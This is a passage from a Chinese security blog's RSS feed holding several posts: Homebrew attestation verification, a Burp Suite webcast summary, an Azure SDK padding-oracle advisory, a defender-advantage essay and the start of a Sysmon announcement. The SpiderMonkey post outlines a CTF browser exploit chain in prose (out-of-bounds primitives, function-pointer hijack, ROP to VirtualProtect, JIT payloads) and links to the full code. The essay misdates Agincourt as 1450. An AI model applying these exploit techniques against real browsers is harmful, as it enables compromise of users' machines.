&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;brew update
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;brew tap trailofbits/homebrew-brew-verify
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;brew verify bash
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 方式2：安装时自动验证&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;HOMEBREW_VERIFY_ATTESTATIONS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;brew install cowsay
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;技术架构细节&#34;&gt;技术架构细节
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;底层依赖&lt;/strong&gt;&lt;br&gt;
基于GitHub的构件证明新特性（artifact attestations），包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;generate-build-provenance&lt;/code&gt; Action&lt;/li&gt;
&lt;li&gt;&lt;code&gt;gh attestation&lt;/code&gt; CLI工具&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;元数据结构&lt;/strong&gt;&lt;br&gt;
采用in-toto声明格式封装以下元数据：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;GitHub仓库及所有者信息&lt;/li&gt;
&lt;li&gt;触发工作流的分支/事件&lt;/li&gt;
&lt;li&gt;构建时的精确git commit&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;未来规划&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将验证工具上游化到brew核心&lt;/li&gt;
&lt;li&gt;开发纯Ruby验证器替代gh CLI依赖&lt;/li&gt;
&lt;li&gt;扩展支持第三方tap仓库的构建证明&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;安全边界说明&#34;&gt;安全边界说明
&lt;/h3&gt;&lt;p&gt;构建证明虽不能防御以下场景：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;软件本身的恶意代码&lt;/li&gt;
&lt;li&gt;应用层的降级攻击
但能显著提升供应链透明度：&lt;/li&gt;
&lt;li&gt;强制攻击行为公开化&lt;/li&gt;
&lt;li&gt;减少攻击者可利用的隐蔽转换环节&lt;/li&gt;
&lt;li&gt;有效应对类似xz-utils后门的分发篡改攻击&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Burp Suite入门与Web应用渗透测试实战指南</title>
        <link>http://localhost:1313/p/burp-suite%E5%85%A5%E9%97%A8%E4%B8%8Eweb%E5%BA%94%E7%94%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/</link>
        <pubDate>Sat, 02 Aug 2025 04:49:48 +0800</pubDate>
        
        <guid>http://localhost:1313/p/burp-suite%E5%85%A5%E9%97%A8%E4%B8%8Eweb%E5%BA%94%E7%94%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/</guid>
        <description>&lt;h1 id=&#34;webcast-burp-suite入门与web应用渗透测试&#34;&gt;Webcast: Burp Suite入门与Web应用渗透测试
&lt;/h1&gt;&lt;p&gt;你是否负责Web应用的安全工作？是否好奇渗透测试人员如何发现其中的漏洞？&lt;br&gt;
Burp Suite是众多Web应用渗透测试者和漏洞赏金猎人的首选工具。虽然入门简单，但其部分高级功能却难以快速掌握。如果你曾观摩他人使用Burp，定能从中获益——每位专家都有独到的使用技巧。&lt;/p&gt;
&lt;p&gt;在这段Black Hills信息安全团队(BHIS)的直播教学中，BB King将演示：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;环境配置&lt;/strong&gt;：针对Web应用和API测试的Burp初始化设置（0:32:33）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;核心功能&lt;/strong&gt;：全工具链快速导览（0:45:25）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;效率提升&lt;/strong&gt;：推荐配置、BApp商店扩展及实战技巧（1:22:08）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;无论你是安全工程师、开发人员还是IT管理者，本教程都能帮助你更高效地使用Burp Suite进行安全评估。&lt;/p&gt;
&lt;h2 id=&#34;资源索引&#34;&gt;资源索引
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.blackhillsinfosec.com/wp-content/uploads/2020/12/SLIDES_GettingStartedWithBurpSuiteOutline.pdf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;演示大纲下载&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/snoopysecurity/awesome-burp-extensions&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Awesome Burp扩展合集&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;FoxyProxy火狐插件&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;PortSwigger官网&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;特别提示：本课程包含Innocent Lives基金会公益宣传环节，支持儿童网络安全保护事业。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>深入探索SpiderMonkey漏洞利用：从基础到高级浏览器攻击技术</title>
        <link>http://localhost:1313/p/%E6%B7%B1%E5%85%A5%E6%8E%A2%E7%B4%A2spidermonkey%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%BB%8E%E5%9F%BA%E7%A1%80%E5%88%B0%E9%AB%98%E7%BA%A7%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/</link>
        <pubDate>Sat, 02 Aug 2025 04:33:34 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%B7%B1%E5%85%A5%E6%8E%A2%E7%B4%A2spidermonkey%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%BB%8E%E5%9F%BA%E7%A1%80%E5%88%B0%E9%AB%98%E7%BA%A7%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/</guid>
        <description>&lt;img src="https://i.imgs.ovh/2025/08/02/HiwQc.png" alt="Featured image of post 深入探索SpiderMonkey漏洞利用：从基础到高级浏览器攻击技术" /&gt;&lt;h1 id=&#34;引言&#34;&gt;引言
&lt;/h1&gt;&lt;p&gt;本文记录了从未接触过浏览器漏洞利用的开发人员针对SpiderMonkey JavaScript Shell解释器和Mozilla Firefox（在Windows 10 RS5 64位系统上）开发三个漏洞利用的过程。近年来，浏览器利用引起了广泛关注，几乎每个主要CTF比赛都包含浏览器挑战，每月都有相关技术文章发布。&lt;/p&gt;
&lt;p&gt;我选择了Firefox的SpiderMonkey JavaScript引擎及其zn13编写的Blazefox挑战作为研究对象。本文展示了在这次探索中的发现和编写的三个漏洞利用：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;basic.js&lt;/strong&gt;：针对特定JavaScript解释器构建的漏洞利用，包含大量硬编码偏移&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;kaizen.js&lt;/strong&gt;：改进版本，动态解析各种信息并使用基线JIT生成ROP gadget&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ifrit.js&lt;/strong&gt;：最终针对Firefox浏览器的漏洞利用，利用JIT编译整个原生代码payload&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;环境设置&#34;&gt;环境设置
&lt;/h1&gt;&lt;p&gt;首先需要设置调试环境，建议在虚拟机中进行。获取Mozilla的代码仓库（使用Git镜像）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone --depth &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; https://github.com/mozilla/gecko-dev.git
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;应用漏洞补丁文件blaze.patch后，安装Mozilla-Build工具链并配置x64调试构建：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;autoconf-2.13
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir build.asserts
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; build.asserts
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;../configure --host&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;x86_64-pc-mingw32 --target&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;x86_64-pc-mingw32 --enable-debug
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mozmake -j2
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;spidermonkey内部机制&#34;&gt;SpiderMonkey内部机制
&lt;/h1&gt;&lt;h2 id=&#34;jsvalues和jsobjects&#34;&gt;JS::Values和JSObjects
&lt;/h2&gt;&lt;p&gt;SpiderMonkey使用JS::Value作为JavaScript值的内部表示，其中高17位（JSVAL_TAG）用于编码类型信息，低47位（payload_）存储实际值或对象指针。&lt;/p&gt;
&lt;p&gt;JavaScript对象在内存中的布局：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;原生对象（NativeObject）包含shapeOrExpando_指针（描述对象属性）和存储元素/属性值的空间&lt;/li&gt;
&lt;li&gt;数组对象（ArrayObject）继承自NativeObject，使用ObjectElements存储长度等信息&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;形状shapes&#34;&gt;形状（Shapes）
&lt;/h2&gt;&lt;p&gt;形状对象描述对象的属性，可以看作是一个哈希表，其中键是属性名，值是该属性值存储的槽位号。形状对象通过parent字段链接在一起形成属性链。&lt;/p&gt;
&lt;h1 id=&#34;漏洞利用开发&#34;&gt;漏洞利用开发
&lt;/h1&gt;&lt;h2 id=&#34;漏洞分析&#34;&gt;漏洞分析
&lt;/h2&gt;&lt;p&gt;漏洞源于添加的array_blaze方法，该方法将数组内部大小字段修改为420，从而允许越界访问：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;blz&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;blz&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;length&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 0
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;blz&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;blaze&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;undefined&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// false
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;blz&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;length&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 420
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;basicjs漏洞利用&#34;&gt;basic.js漏洞利用
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;构建内存访问原语&lt;/strong&gt;：通过相邻数组和TypedArray，将有限的内存读写转换为任意内存访问&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;对象地址泄露原语&lt;/strong&gt;：通过操作相邻对象的属性存储槽位泄露对象地址&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;控制流劫持&lt;/strong&gt;：覆盖js::Class的cOps函数指针&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;栈转移&lt;/strong&gt;：使用ntdll中的gadget实现栈转移&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ntdll基址泄露&lt;/strong&gt;：通过kernel32导入表获取ntdll地址&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;执行原生代码&lt;/strong&gt;：通过ROP链调用VirtualProtect使shellcode可执行&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;kaizenjs改进&#34;&gt;kaizen.js改进
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;提高内存原语可靠性&lt;/strong&gt;：使用Tenured堆中的ArrayBuffer替代Nursery堆中的对象&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;动态解析函数地址&lt;/strong&gt;：通过PE结构解析导出函数地址&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;JIT gadget生成&lt;/strong&gt;：强制JIT编译特定函数生成所需ROP gadget&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;ifritjs高级利用&#34;&gt;ifrit.js高级利用
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;编译Firefox&lt;/strong&gt;：构建64位Firefox用于漏洞研究&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;配置开发环境&lt;/strong&gt;：禁用沙箱和多进程模式便于调试&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;JIT完整payload&lt;/strong&gt;：通过精心构造的JavaScript函数，使JIT编译器生成完整的原生payload&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;结论&#34;&gt;结论
&lt;/h1&gt;&lt;p&gt;本文详细介绍了从基础的漏洞利用到高级的JIT代码重用技术的演进过程。通过三种逐步改进的漏洞利用方法，展示了如何克服现代浏览器安全机制的挑战。虽然这些技术针对特定版本的SpiderMonkey，但其中涉及的概念和方法对理解现代浏览器漏洞利用具有普遍意义。&lt;/p&gt;
&lt;p&gt;完整代码和材料可在&lt;a class=&#34;link&#34; href=&#34;https://github.com/0vercl0k/blazefox&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;blazefox GitHub仓库&lt;/a&gt;获取，包括调试扩展、漏洞利用代码、构建的二进制文件和脚本等。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Azure Storage SDK客户端加密填充Oracle漏洞缓解方案</title>
        <link>http://localhost:1313/p/azure-storage-sdk%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%8A%A0%E5%AF%86%E5%A1%AB%E5%85%85oracle%E6%BC%8F%E6%B4%9E%E7%BC%93%E8%A7%A3%E6%96%B9%E6%A1%88/</link>
        <pubDate>Sat, 02 Aug 2025 04:16:37 +0800</pubDate>
        
        <guid>http://localhost:1313/p/azure-storage-sdk%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%8A%A0%E5%AF%86%E5%A1%AB%E5%85%85oracle%E6%BC%8F%E6%B4%9E%E7%BC%93%E8%A7%A3%E6%96%B9%E6%A1%88/</guid>
        <description>&lt;h2 id=&#34;摘要&#34;&gt;摘要
&lt;/h2&gt;&lt;p&gt;谷歌根据协调漏洞披露(CVD)向微软报告了可能影响使用Azure Storage SDK(Python/.NET/Java版)客户端加密功能的填充Oracle漏洞(CVE-2022-30187)。微软已于2022年7月12日发布客户端加密功能v2正式版(GA)进行修复。目前未发现该漏洞在Azure服务中被利用的案例。&lt;/p&gt;
&lt;h2 id=&#34;客户影响&#34;&gt;客户影响
&lt;/h2&gt;&lt;p&gt;使用受影响版本客户端加密功能的应用需升级至v2版本以确保安全。客户可通过Azure Storage博客中的&amp;quot;如何验证是否使用客户端加密功能&amp;quot;章节确认影响范围。迁移v2需要：a)更新代码使用v2加密方案；b)迁移v1加密数据至v2。替代方案可考虑使用Azure存储服务端加密。&lt;/p&gt;
&lt;h2 id=&#34;技术细节&#34;&gt;技术细节
&lt;/h2&gt;&lt;p&gt;Azure Storage SDK原v1版本使用CBC分组加密模式，当攻击者具有blob写入权限并能观测解密失败时，可能实施填充Oracle攻击。研究表明攻击者需对每个明文字节执行大量密钥操作才能解密blob内容。微软感谢谷歌通过CVD流程报告该漏洞。&lt;/p&gt;
&lt;h2 id=&#34;参考资源&#34;&gt;参考资源
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://azure.microsoft.com/blog&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Azure Storage博客&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-30187&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CVE-2022-30187&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;技术支持：通过Azure门户提交支持案例(aka.ms/azsupt)&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>将防御者的困境转化为防御者的优势：网络安全新思维</title>
        <link>http://localhost:1313/p/%E5%B0%86%E9%98%B2%E5%BE%A1%E8%80%85%E7%9A%84%E5%9B%B0%E5%A2%83%E8%BD%AC%E5%8C%96%E4%B8%BA%E9%98%B2%E5%BE%A1%E8%80%85%E7%9A%84%E4%BC%98%E5%8A%BF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%96%B0%E6%80%9D%E7%BB%B4/</link>
        <pubDate>Sat, 02 Aug 2025 03:55:18 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%B0%86%E9%98%B2%E5%BE%A1%E8%80%85%E7%9A%84%E5%9B%B0%E5%A2%83%E8%BD%AC%E5%8C%96%E4%B8%BA%E9%98%B2%E5%BE%A1%E8%80%85%E7%9A%84%E4%BC%98%E5%8A%BF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%96%B0%E6%80%9D%E7%BB%B4/</guid>
        <description>&lt;h1 id=&#34;将防御者的困境转化为防御者的优势&#34;&gt;将防御者的困境转化为防御者的优势
&lt;/h1&gt;&lt;p&gt;网络安全防御者处于天然劣势的观点——即所谓的&amp;quot;防御者困境&amp;quot;——不仅是错误的，而且具有反作用。与其只关注如何应对攻击者的策略，我们更应该识别并利用防御者身份的固有优势。本文将阐述防御者思维的内涵，以及它如何帮助强化安全体系。&lt;/p&gt;
&lt;h2 id=&#34;什么是防御者困境&#34;&gt;什么是防御者困境？
&lt;/h2&gt;&lt;p&gt;多年来，安全专业人士一直用&amp;quot;防御者困境&amp;quot;来解释为何企业在防范网络攻击时处于劣势。其核心观点是：&lt;/p&gt;
&lt;p&gt;&amp;ldquo;防御者处于劣势，因为我们必须时刻保持正确，而攻击者只需成功一次。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;按照这种观点，防御者需要关注所有可能的攻击路径并全面防护。我们必须艰难地选择重点防御哪些攻击路径（这就是困境所在），这使我们处于不利地位。这种劣势还源于我们需要全面应对每一次攻击，这意味着有时会漏掉某些攻击。&lt;/p&gt;
&lt;p&gt;防御者困境的概念不仅令人沮丧，而且并不正确。防御者完全可以获得相对于攻击者的优势。&lt;/p&gt;
&lt;h2 id=&#34;防御者困境的谬误&#34;&gt;防御者困境的谬误
&lt;/h2&gt;&lt;p&gt;防御者困境之所以是谬误，部分原因在于它过度简化了网络攻击的复杂性。以MITRE ATT&amp;amp;CK框架为例，它展示了攻击者为达成目标必须遵循的多步骤过程。根据ATT&amp;amp;CK，攻击者通常从侦察开始，进展到资源开发，再到初始访问，之后还必须突破多个阶段才能实现目标。&lt;/p&gt;
&lt;p&gt;攻击者必须成功完成每个阶段才能达成任务。而防御者只需干扰其中一个环节就能挫败攻击，迫使攻击者调整策略。行业资深人士Richard Bejtlich早在2009年就在入侵检测背景下观察到这点，创造了&amp;quot;入侵者困境&amp;quot;一词。他指出：&lt;/p&gt;
&lt;p&gt;&amp;ldquo;防御者只需检测到入侵者存在的一个指标，就能在企业内部启动事件响应。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;另一位备受尊敬的网络安全专家David J. Bianco在2023年扩展了这一观点，提出了&amp;quot;攻击者困境&amp;quot;的概念。除了指出&amp;quot;攻击者必须在整个攻击生命周期中都做对&amp;quot;，他还强调：&lt;/p&gt;
&lt;p&gt;&amp;ldquo;攻击者通常在不完全了解目标环境的情况下行动。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;我们的固有优势——防御者优势——在于我们能够比攻击者更深入地了解自身环境。通过前瞻性规划和设计，我们可以创建改变与攻击者互动方式的安全架构。&lt;/p&gt;
&lt;h2 id=&#34;获取防御者优势&#34;&gt;获取防御者优势
&lt;/h2&gt;&lt;p&gt;防御者困境假设防御者只能被动等待攻击发生然后响应。这种被动立场让攻击者掌握了主动权，使防御者总是处于追赶状态。为改变这种态势，行业分析师强调防御者需要实践&amp;quot;主动安全&amp;quot;。Omdia的Eric Parizo用这个术语鼓励企业：&lt;/p&gt;
&lt;p&gt;&amp;ldquo;在可能的威胁对扩展IT环境构成危险之前，就主动寻找并消除它们。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;Forrester的Erik Nost认为，实践主动安全意味着通过强大的可见性、优先级排序和修复来控制安全态势并减少违规。这一过程始于对环境的深入了解，这样我们才能知道需要保护的资源和需要解决的安全弱点。&lt;/p&gt;
&lt;p&gt;地形认知并非网络安全独有，这个概念适用于各个领域的攻击者和防御者，包括历史上的战场。例如，在1450年的阿金库尔战役中，英军将自己部署在两侧有树林的狭窄战场上，将法国骑士引入受限空间。通过收窄战线，英军击败了规模大得多的法军。&lt;/p&gt;
&lt;p&gt;就像阿金库尔战役一样，在网络安全防御中创建瓶颈点是建立防御者优势的一种方式。例如，通过单点登录(SSO)提供商集中SaaS登录，可以让组织应用可靠的安全措施，如双因素认证和异常检测。SSO迫使攻击者通过防御者控制的瓶颈点来攻击SaaS目标，使他们处于劣势。&lt;/p&gt;
&lt;p&gt;更广泛地说，要获得防御者优势，我们应该：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;了解我们的环境&lt;/strong&gt;：持续更新所有资产的清单，包括硬件、软件、SaaS平台和用户账户。了解每项资源的业务目的。这一基础步骤让我们明确知道需要保护什么以及潜在的安全改进点在哪里。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;最小化攻击面&lt;/strong&gt;：定期修补漏洞软件，关闭不需要的系统，禁用或停用不需要的服务，并强制使用SSO来减少入口点。这些行动共同减少了潜在的攻击向量数量。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;基于上下文优先修复&lt;/strong&gt;：根据系统关键性、业务流程和敏感性评估每个漏洞的风险。优先解决最重大的风险。这种有针对性的方法确保资源被有效分配到最高优先级的领域。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;有节制地修复&lt;/strong&gt;：制定并执行修复计划，以可控和实际的方式实施变更。监控修复工作的进展和效果，使用指标跟踪改进并在需要时干预。这确保安全改进项目能达到预期效果。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;要获得防御者优势，首先需要彻底了解你的环境，这使你能够识别和修复弱点，部署自动化响应措施，并设计将攻击引导至防御最严密环节的架构。通过减少攻击面和优先处理安全改进机会来最小化攻击路径可能。监督修复工作以确保进展。通过从被动思维转向主动思维，彻底扭转攻击者的优势。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Sysmon v6 安全监控工具发布公告：增强Windows系统安全事件追踪能力</title>
        <link>http://localhost:1313/p/sysmon-v6-%E5%AE%89%E5%85%A8%E7%9B%91%E6%8E%A7%E5%B7%A5%E5%85%B7%E5%8F%91%E5%B8%83%E5%85%AC%E5%91%8A%E5%A2%9E%E5%BC%BAwindows%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E8%BF%BD%E8%B8%AA%E8%83%BD%E5%8A%9B/</link>
        <pubDate>Sat, 02 Aug 2025 03:38:35 +0800</pubDate>
        
        <guid>http://localhost:1313/p/sysmon-v6-%E5%AE%89%E5%85%A8%E7%9B%91%E6%8E%A7%E5%B7%A5%E5%85%B7%E5%8F%91%E5%B8%83%E5%85%AC%E5%91%8A%E5%A2%9E%E5%BC%BAwindows%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E8%BF%BD%E8%B8%AA%E8%83%BD%E5%8A%9B/</guid>
        <description>&lt;h1 id=&#34;工具发布公告sysmon-v6安全监控工具&#34;&gt;工具发布公告：Sysmon v6安全监控工具
&lt;/h1&gt;&lt;p&gt;Sysmon正在持续进化。&lt;br&gt;
